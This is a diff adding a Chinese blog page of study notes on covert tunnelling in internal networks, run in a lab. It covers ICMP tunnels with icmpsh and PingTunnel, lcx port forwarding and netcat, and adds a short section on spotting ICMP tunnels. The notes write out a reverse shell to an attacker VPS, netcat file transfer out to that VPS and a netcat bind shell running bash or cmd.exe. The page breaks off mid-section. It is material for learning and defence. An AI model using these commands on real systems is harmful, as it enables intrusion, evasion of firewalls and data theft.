@@ -1,0 +1,905 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>内网安全学习二-隐藏通信隧道技术 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="内网安全学习二-隐藏通信隧道技术">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-06 16:22" pubdate>
+        2021年2月6日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      89
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网安全学习二-隐藏通信隧道技术</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月20日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-隐藏通信隧道介绍"><a href="#1-隐藏通信隧道介绍" class="headerlink" title="1.隐藏通信隧道介绍"></a>1.隐藏通信隧道介绍</h1><p>​    一般的网络通信，先是在两台机器之间建立TCP连接，然后进行正常的数据通信。在知道IP地址的情况下，可以直接发送报文；如果不知道IP地址，就需要将域名解析成IP地址。在实际的网络中，通常会通过各种边界设备、软硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异常，就会对通信进行阻断。</p>
+<p>​    在内网安全攻防中，所说的<strong>隧道</strong>，就是一种绕过端口屏蔽的通行方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙与对方通信。当被封装的数据包到达目的地的时候，将数据包还原，并将还原后的数据包发送到相应的服务器商。</p>
+<p>常用的隧道列举：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">网络层：IPV6隧道、ICMP隧道、GRE隧道<br>传输层：TCP隧道、UDP隧道、常规的端口转发<br>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道。<br></code></pre></td></tr></table></figure>
+<h1 id="2-判断内网连通性"><a href="#2-判断内网连通性" class="headerlink" title="2.判断内网连通性"></a>2.判断内网连通性</h1><p>​    判断内网的连通性是指判断机器是否能够连上外网等。综合判断各种协议（TCP、HTTP、DNS、ICMP等）和端口通信的情况。</p>
+<p>常用的内网连通性判断如下</p>
+<h2 id="1-ICMP协议"><a href="#1-ICMP协议" class="headerlink" title="1.ICMP协议"></a>1.ICMP协议</h2><p>通过执行<code>ping &lt;IP地址或域名&gt;</code>命令即可</p>
+<h2 id="2-TCP协议"><a href="#2-TCP协议" class="headerlink" title="2.TCP协议"></a>2.TCP协议</h2><p>可以利用<code>netcat</code>这个工具来进行探测。</p>
+<p>使用<code>nc &lt;IP地址 端口号&gt;</code>命令</p>
+<h2 id="3-HTTP协议"><a href="#3-HTTP协议" class="headerlink" title="3.HTTP协议"></a>3.HTTP协议</h2><p>使用<code>curl &lt;IP地址:端口号&gt;</code>命令即可探测；如果远程主机开启了相应的端口，会输出相应的端口信息，如果没有开启相应的端口，则会没有任何提示。</p>
+<h2 id="4-DNS协议"><a href="#4-DNS协议" class="headerlink" title="4.DNS协议"></a>4.DNS协议</h2><p>进行DNS的连通性的检测，常用的命令是nslookup和dig。</p>
+<p>​    对windows，采用<code>nslookup www.baidu.com vps-ip</code>命令即可，因为对于windows，nslookup的命令是系统自带的。在没有指定vps-ip时，nslookup会从系统网络的TCP/IP属性中读取DNS服务器的地址。</p>
+<p>​    对于linux，则可以利用<code>dig @vps-ip www.baidu.com</code>即可，因为dig是linux系统自带的dns探测命令。如果没有指定vps-ip，dig会到<code>/etc/resolv.conf</code>文件中读取系统配置的DNS服务器的地址。如果vps-ip为192.168.43.1,将解析百度网的ip地址，说明DNS是联通的。</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/1.png" srcset="/img/loading.gif"></p>
+<h2 id="5-特殊情况"><a href="#5-特殊情况" class="headerlink" title="5.特殊情况"></a>5.特殊情况</h2><p>还有一种情况流量不能直接流出，需要再内网中设置代理服务器，常见于通过企业办公网段上网的场景。判断方法如下：</p>
+<p>1.查看网络连接，判断是否存在与其他机器8080等端口的连接，可以尝试用<code>ping -n 1 -a ip</code></p>
+<p>2.查看内网中是否有主机名类似<code>proxy</code>的机器</p>
+<p>3.查看<code>IE浏览器</code> 的直接代理</p>
+<p>4.根据pac文件的路径（可能是本地路径，也可能是远程路径），将其下载下来并查看</p>
+<p>5.执行如下命令，利用curl工具进行确认</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">curl</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> 不通<br><span class="hljs-selector-tag">curl</span> <span class="hljs-selector-tag">-x</span> <span class="hljs-selector-tag">proxy-ip</span><span class="hljs-selector-pseudo">:port</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> 通<br></code></pre></td></tr></table></figure>
+<h1 id="3-网络层隧道技术"><a href="#3-网络层隧道技术" class="headerlink" title="3.网络层隧道技术"></a>3.网络层隧道技术</h1><h2 id="1-ICMP隧道技术"><a href="#1-ICMP隧道技术" class="headerlink" title="1.ICMP隧道技术"></a>1.ICMP隧道技术</h2><p>​    ICMP隧道简单又实用。在一般的通信协议里，如果两台设备要进行通信的话，肯定需要开放端口，而在ICMP协议下就不需要了。常见的ICMP消息就是<code>ping</code> 命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。通常的情况下，每个ping命令都有相对应的回复和请求。</p>
+<p>​    如果我们使用各类的上层隧道进行的操作都失败了，我们可以尝试用ping命令来访问远程的计算机，尝试建立ICMP隧道，将TCP/UDP的数据封装到ICMP的ping数据包里，从而穿过防火墙，实现不受限制的网络访问。</p>
+<p>​    常用的ICMP隧道工具：icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p>
+<h3 id="1-icmpsh"><a href="#1-icmpsh" class="headerlink" title="1.icmpsh"></a>1.icmpsh</h3><p><a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a></p>
+<p>在使用之前，我们还需要在攻击者的VPS上安装PYTHON的<code>impacket</code>类库，以便对TCP、UDP、ICMP、IGMP、ARP、IPV4、IPV6等协议进行访问。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">python</span>-impacket<br></code></pre></td></tr></table></figure>
+<p>同时，因为icmpsh工具要代替系统本身的ping命令的应答程序，所以需要输入以下命令来关闭本地系统的ICMP应答，否则shell会不稳定（表现为一直刷屏，无法进行交互输入）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sysctl</span> -w net.ipv<span class="hljs-number">4</span>.icmp_echo_ignore_all=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/2.png" srcset="/img/loading.gif"></p>
+<h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><p>cd 到icmpsh的目录下，输入<code>./run.sh</code>并运行，会提示输入目标的IP地址（目标主机的公网IP地址）。</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/3.png" srcset="/img/loading.gif"></p>
+<p>我使用虚拟机的环境进行演示做笔记的，所以用的是<code>172.16.55.128</code>（假设是目标的公网IP地址）</p>
+<p>但是我这边会出现一个报错</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/4.png" srcset="/img/loading.gif"></p>
+<p>我看了一下run.sh的内容。可以发现问题</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/5.png" srcset="/img/loading.gif"></p>
+<p>所以我打算自己直接使用icmpsh_m.py来自己传入指定的参数值，攻击者的VPS的公网IP、目标主机的公网IP。</p>
+<p>在自己的VPS上执行如下语句</p>
+<p><code>python icmpsh_m.py VPS公网IP 目标主机的公网IP</code></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/6.png" srcset="/img/loading.gif"></p>
+<p>然后将icmpsh.exe传到目标主机上，执行如下语句</p>
+<p><code>icmpsh.exe -t 攻击者的VPS公网IP -d 500 -b 30 -s 128</code></p>
+<p>参数的具体含义可以通过过<code>icmpsh.exe -h</code>查看</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/7.png" srcset="/img/loading.gif"></p>
+<p>成功弹回shell。可以看到ipconfig执行的结果是目标主机的ip地址。</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/8.png" srcset="/img/loading.gif"></p>
+<h3 id="2-PingTunnel"><a href="#2-PingTunnel" class="headerlink" title="2.PingTunnel"></a>2.PingTunnel</h3><p>假设如下的测试环境：</p>
+<p>攻击者VPS(DEEPIN)；一个小型的内网：两台服务器，一台是windows server 2008数据库服务器(ip:172.16.55.131)，另一台是LINUX web服务器(我用kali作为目标的web服务器，内网ip:172.16.55.128，公网ip:172.16.56.128)，我们能够访问这个linux web服务器，但是无法访问数据库服务器。</p>
+<p>该工具可以跨平台使用。为了避免隧道被滥用，还可以为隧道设置密码。</p>
+<p><a target="_blank" rel="noopener" href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a> 下载地址</p>
+<p><strong>注意：需要在建立ICMP隧道的两台机器（VPS和Web服务器上）安装PingTunnel工具。</strong></p>
+<h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p><code>tar xf PingTunnel-0.72.tar.gz</code></p>
+<p><code>cd PingTunnel</code></p>
+<p>执行<code>make &amp;&amp; make install</code>但是需要用root权限。</p>
+<p>如果在安装的过程出现了错误，例如提示缺少pcap.h或者任何可能要安装libpcap(Packet Capture Library-数据库捕获函数库，用于捕捉经过指定网络端口的数据包)的提示。</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/9.png" srcset="/img/loading.gif"></p>
+<p><code>wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</code></p>
+<p>下载后需要进行解压文件、编译安装</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">tar</span> <span class="hljs-selector-tag">zxvf</span> <span class="hljs-selector-tag">libpcap-1</span>.9.0<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span><br><span class="hljs-selector-tag">cd</span> <span class="hljs-selector-tag">libpcap-1</span>.9.0<br>./<span class="hljs-selector-tag">configure</span><br></code></pre></td></tr></table></figure>
+<p>可能还会出现其他错误：说缺少flex或者lex</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/10.png" srcset="/img/loading.gif"></p>
+<p>用<code>apt-get install flex</code>安装即可</p>
+<p>再重新<code>./configure</code>，又发生了其他错误：缺少了yacc包的错误</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/11.png" srcset="/img/loading.gif"></p>
+<p>用<code>apt-get install byacc</code>即可</p>
+<p>再执行<code>./configure</code>终于成功了</p>
+<p>执行<code>make &amp;&amp; make install </code>就最后编译libpcap成功了</p>
+<p>最后到PingTunnel目录下进行最后编译<code>make &amp;&amp; make install</code></p>
+<p>可以执行</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/12.png" srcset="/img/loading.gif"></p>
+<h4 id="使用：-1"><a href="#使用：-1" class="headerlink" title="使用："></a>使用：</h4><p>在目标Llinux web服务器上执行如下命令：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">ptunnel</span> -<span class="hljs-variable">x</span> <span class="hljs-function"><span class="hljs-title">reader</span>(自定义隧道密码)</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/13.png" srcset="/img/loading.gif"></p>
+<p>在攻击者VPS上执行如下命令：(记得加上sudo)</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sudo</span> ptunnel -p 目标<span class="hljs-built_in">ip</span> -lp 本地端口 -da 要访问的内网机器的<span class="hljs-built_in">ip</span> -dp 要访问的内网机器的端口 -x reader<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/14.png" srcset="/img/loading.gif"></p>
+<p>参数介绍:</p>
+<p>1.-x：指定ICMP隧道连接的验证密码。</p>
+<p>2.-lp：指定要监听的本地端口。</p>
+<p>3.-da：指定要转发的目标机器的ip地址。</p>
+<p>4.-dp：指定要转发的目标机器的TCP端口。</p>
+<p>5.-p：指定ICMP隧道的另一端的机器的IP地址。</p>
+<p>随后，我们访问VPS的1080端口，就会和目标服务器172.16.56.130的3389端口建立连接了：</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/15.png" srcset="/img/loading.gif"></p>
+<p>访问VPS本地的9898端口，成功访问了目标机器的3389端口</p>
+<h4 id="小计："><a href="#小计：" class="headerlink" title="小计："></a>小计：</h4><p>PingTunnel工具在Windows也是可以使用的，只不过需要在内网的windows机器上安装wincap类库</p>
+<h2 id="2-防御ICMP隧道的攻击"><a href="#2-防御ICMP隧道的攻击" class="headerlink" title="2.防御ICMP隧道的攻击"></a>2.防御ICMP隧道的攻击</h2><p>使用ICMP隧道的时候会产生大量的ICMP数据包，我们可以通过wireshark进行数据包的分析，以检测恶意流量。具体方法如下：</p>
+<p>1.检测同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多两个数据包，而使用ICMP隧道的数据包的浏览器在很短的时间内会产生上千个ICMP数据包。</p>
+<p>2.注意payload大于64bit的ICMP数据包</p>
+<p>3.寻找响应数据包中的payload与请求包中的payload不一致的ICMP数据包。</p>
+<p>4.检查ICMP数据包的协议标签。例如，icmptunnel会在所有的ICMP的payload前面添加<code>TUNL</code>标记来标识隧道-这就是特征。</p>
+<h1 id="4-传输层隧道技术"><a href="#4-传输层隧道技术" class="headerlink" title="4.传输层隧道技术"></a>4.传输层隧道技术</h1><p>​    传输层隧道技术包括TCP隧道、UDP隧道和常规的端口转发。</p>
+<h2 id="1-lcx端口转发"><a href="#1-lcx端口转发" class="headerlink" title="1.lcx端口转发"></a>1.lcx端口转发</h2><p>​    lcx是一个基于Socket套接字实现 的端口转发工具，有windows和linux两个版本。windows为<code>lcx.exe</code>，linux为<code>portmap</code>。一个正常的Socket隧道必须具有两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端，通过传入服务器的IP地址和端口，才能主动与服务端连接。</p>
+<h3 id="1-内网端口转发"><a href="#1-内网端口转发" class="headerlink" title="1.内网端口转发"></a>1.内网端口转发</h3><p>在目标机器上执行如下命令，将目标机器的3389端口的所有数据转发到公网VPS的5555端口上</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span>.exe -slave &lt;公网VPSIP地址&gt; <span class="hljs-number">5555</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
+<p>在VPS(windows)上执行如下命令，将本机的5555端口上监听到的所有数据转发到本机的6666端口上。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span>.exe -listen <span class="hljs-number">5555</span> <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+<p>此时，访问连接<code>&lt;公网IP地址&gt;:5555</code>，就是访问目标服务器的3389端口。</p>
+<h3 id="2-本地端口映射"><a href="#2-本地端口映射" class="headerlink" title="2.本地端口映射"></a>2.本地端口映射</h3><p>​    如果服务器由于防火墙等的限制，部分端口（例如3389）的数据无法通过防火墙，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口（例如53）。在目标服务器上执行如下命令，就可以直接从远程桌面连接目标主机的53端口。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span> -tran <span class="hljs-number">53</span> &lt;目标主机IP地址&gt; <span class="hljs-number">3389</span>z<br></code></pre></td></tr></table></figure>
+<h2 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2.netcat"></a>2.netcat</h2><p>这个工具很出名的，我就不介绍了。</p>
+<h3 id="1-简单使用"><a href="#1-简单使用" class="headerlink" title="1.简单使用"></a>1.简单使用</h3><h4 id="1-参数介绍"><a href="#1-参数介绍" class="headerlink" title="1.参数介绍"></a>1.参数介绍</h4><p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/17.png" srcset="/img/loading.gif"></p>
+<p><code>-d</code>：后台模式</p>
+<p><code>-e</code>：程序重定向</p>
+<p><code>-g &lt;网关&gt;</code>：设置路由器跳跃通信网关，最多可设置8个</p>
+<p><code>-G &lt;指向器数目&gt;</code>：设置源路由指向器的数量，值是4的倍数。</p>
+<p><code>-i&lt;延迟的秒数&gt;</code>：设置时间间隔</p>
+<p><code>-l</code>：使用监听模式</p>
+<p><code>-n</code>：直接使用IP地址（不通过域名服务器）</p>
+<p><code>-o &lt;输出文件&gt;</code>：指定文件名称，把往来传输的数据转换为十六进制字节码后保存在该文件中。</p>
+<p><code>-p &lt;通信端口&gt;</code>：设置本地主机使用的通信端口。</p>
+<p><code>-r </code>：随机指定本地与远程主机的通信端口</p>
+<p><code>-s &lt;源地址&gt;</code>：设置本地主机送出数据包的IP地址</p>
+<p><code>-u</code>：使用UDP传输协议。</p>
+<p><code>-v</code>：详细输出</p>
+<p><code>-w&lt;超时秒数&gt;</code>：设置等待连线的时间</p>
+<p><code>-z</code>：将输入/输出功能关闭，只在扫描通信端口时使用。</p>
+<h4 id="2-简单功能介绍"><a href="#2-简单功能介绍" class="headerlink" title="2.简单功能介绍"></a>2.简单功能介绍</h4><p>1.Banner抓取</p>
+<p><code>nc -nv 目标IP 指定端口</code></p>
+<p>可以将目标IP的指定端口的服务Banner信息抓取下来</p>
+<p>2.连接远程主机</p>
+<p><code>nc -nvv 远程主机IP 端口</code></p>
+<p>3.端口扫描</p>
+<p><code>nc -v 目标主机IP 端口</code></p>
+<p><strong>4.端口监听</strong></p>
+<p><code>nc -l -p 9999</code></p>
+<p>5.文件传输</p>
+<p>本地VPS执行：<code>nc -lp 3333 &gt; 1.txt</code>监听到的数据传输到1.txt</p>
+<p>目标主机执行：<code>nc -vn VPSip 监听的端口 &lt; test.txt -q 1</code></p>
+<p>6.简易聊天</p>
+<p>在本地VPS主机执行：<code>nc -l -p 888</code></p>
+<p>在目标主机中执行：<code>nc -vn VPSip 端口</code></p>
+<h3 id="2-获取SHELL"><a href="#2-获取SHELL" class="headerlink" title="2.获取SHELL"></a>2.获取SHELL</h3><p>shell分两种，一种是正向shell，另一种是反向shell。如果客户端连接服务端，客户端想获取服务器的shell，就称为正向shell；如果客户端连接服务器，服务器想要获取客户端的shell，就称为反向shell。</p>
+<p>目标主机：kali ——-&gt; ip:172.16.56.129     172.16.55.128</p>
+<p>本机或VPS：deepin  ———-&gt;ip:172.16.56.1</p>
+<h4 id="1-正向shell"><a href="#1-正向shell" class="headerlink" title="1.正向shell"></a>1.正向shell</h4><p>目标主机执行如下命令：（此时目标主机为服务端，攻击者为客户端）</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvp 监听的端口 -e <span class="hljs-regexp">/bin/</span>bash        <span class="hljs-regexp">//</span>linux<br>nc -lvp 监听的端口 -e c:\windows\system32\cmd.exe <span class="hljs-regexp">//</span>windows<br></code></pre></td></tr></table></figure>
+<p>本机或者VPS执行如下命令：</p>
